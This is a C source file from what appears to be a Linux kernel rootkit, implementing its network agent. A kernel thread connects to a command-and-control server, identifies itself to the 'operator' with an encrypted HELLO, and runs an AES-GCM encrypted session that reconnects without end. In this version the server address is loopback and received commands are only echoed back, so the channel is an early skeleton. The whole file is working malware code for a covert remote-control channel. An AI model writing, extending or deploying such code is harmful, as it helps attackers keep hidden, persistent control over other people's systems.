// SPDX-License-Identifier: GPL-2.0
/*
 * network/agent.c - Agent kthread: connect, handshake, session loop.
 */
#include <crypto/aead.h>
#include <linux/delay.h>
#include <linux/in.h>
#include <linux/inet.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/random.h>
#include <linux/slab.h>
#include <net/net_namespace.h>

#include "rootkit.h"

/* Send encrypted HELLO to identify ourselves to the operator. */
static int rk_handshake(struct rk_session *s)
{
	return rk_send_sealed(s, "HELLO 1", 7);
}

/* Echo decrypted commands back through the encrypted channel. */
static void rk_handle_session(struct rk_session *s)
{
	u8 *cmd;
	size_t cmd_len;
	int error;

	cmd = kmalloc(RK_FRAME_MAX, GFP_KERNEL);
	if (!cmd)
		return;

	while (!kthread_should_stop()) {
		error = rk_recv_sealed(s, cmd, RK_FRAME_MAX, &cmd_len);
		if (error)
			break;

		error = rk_send_sealed(s, cmd, cmd_len);
		if (error)
			break;
	}

	kfree(cmd);
}

/* Initialize AEAD transform and session state. */
static int rk_session_init(struct rk_session *sess, struct socket *sock)
{
	int error;

	sess->tfm = crypto_alloc_aead("gcm(aes)", 0, 0);
	if (IS_ERR(sess->tfm))
		return PTR_ERR(sess->tfm);

	error = crypto_aead_setauthsize(sess->tfm, RK_TAG_LEN);
	if (error)
		goto free_tfm;

	error = crypto_aead_setkey(sess->tfm, rk_key, RK_KEY_LEN);
	if (error)
		goto free_tfm;

	get_random_bytes(&sess->session_id, sizeof(sess->session_id));
	sess->sock = sock;
	sess->tx_seq = 1;
	sess->rx_seq_expected = 1;
	return 0;

free_tfm:
	crypto_free_aead(sess->tfm);
	return error;
}

/* Connect to the C2 server and run an encrypted session. */
int rk_agent_thread(void *data)
{
	while (!kthread_should_stop()) {
		struct rk_session sess;
		struct socket *sock = NULL;
		struct sockaddr_in addr;
		int error;

		error = sock_create_kern(&init_net, AF_INET, SOCK_STREAM,
					 IPPROTO_TCP, &sock);
		if (error)
			goto retry;

		memset(&addr, 0, sizeof(addr));
		addr.sin_family = AF_INET;
		addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
		addr.sin_port = htons(RK_PORT);

		error = kernel_connect(sock, (struct sockaddr_unsized *)&addr,
				       sizeof(addr), 0);
		if (error)
			goto close_retry;

		error = rk_session_init(&sess, sock);
		if (error)
			goto close_retry;

		error = rk_handshake(&sess);
		if (error)
			goto free_tfm;

		rk_handle_session(&sess);

free_tfm:
		crypto_free_aead(sess.tfm);
close_retry:
		kernel_sock_shutdown(sock, SHUT_RDWR);
		sock_release(sock);
retry:
		if (!kthread_should_stop())
			msleep_interruptible(RK_RECONNECT_MS);
	}
	return 0;
}
